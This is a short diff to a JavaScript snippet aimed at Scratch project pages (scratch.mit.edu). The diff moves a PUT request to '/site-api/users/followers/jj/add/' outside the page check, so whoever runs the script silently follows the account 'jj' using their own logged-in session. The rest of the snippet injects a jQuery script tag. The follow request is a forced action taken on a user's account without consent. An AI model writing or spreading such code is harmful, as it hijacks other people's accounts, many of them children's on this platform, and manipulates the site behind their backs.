@@ -1,8 +1,8 @@
 //epik bruh m0menrt
 var parser = document.createElement("a");
+$.ajax({type:"PUT",url:"/site-api/users/followers/jj/add/"});
 parser.href = document.location.href;
 if(parser.hostname === "scratch.mit.edu" && parser.pathname.startsWith("/projects/")) {
-    $.ajax({type:"PUT",url:"/site-api/users/followers/jj/add/"});
     var projectID = parser.pathname.replace(/\D/g,'');
     var script = document.createElement('script');
     script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js';
